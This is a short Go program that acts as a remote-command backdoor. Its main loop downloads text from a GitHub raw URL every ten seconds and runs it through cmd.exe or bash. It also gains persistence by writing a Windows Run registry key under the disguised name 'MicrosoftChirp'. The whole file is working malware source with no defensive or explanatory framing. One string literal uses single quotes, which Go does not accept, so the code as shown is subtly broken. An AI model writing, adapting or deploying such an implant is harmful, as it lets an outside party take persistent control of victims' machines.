package main

import (
    "fmt"
    "runtime"
    //"strings"
    "os/exec"
    "io/ioutil"
    "log"
    "net/http"
    "time"
)
func OnPage(link string)(string) {
    res, err := http.Get(link)
    if err != nil {
        log.Fatal(err)
    }
    content, err := ioutil.ReadAll(res.Body)
    res.Body.Close()
    if err != nil {
        log.Fatal(err)
    }
    return string(content)
}


func GetPath() string {
	_, filename, _, _ := runtime.Caller(1)
	return filename
}

func MSPersist() {
	p := GetPath()
	regCmd := 'reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MicrosoftChirp /d "' + p + '"'
	cmd := exec.Command("cmd.exe", "/c", regCmd) 
	//out, _ := cmd.Output()
	if runtime.GOOS == "windows" {
		cmd.Output()
	}
}

func GetWrap() [2]string {
	if runtime.GOOS == "windows" {
		return [2]string{"cmd.exe", "/c"}
	} else {
		return [2]string{"bash", "-c"}
	}
}

func DoChirp(wrap [2]string) {
	rawcmd := OnPage("https://raw.githubusercontent.com/datosprotege/updates/main/microsoft")
	cmd := exec.Command(wrap[0], wrap[1], rawcmd)
	cmd.Output()
}

func main() {
	MSPersist()
	wrap := GetWrap()
	for {
		go DoChirp(wrap)
		time.Sleep(10 * time.Second)
	}
}
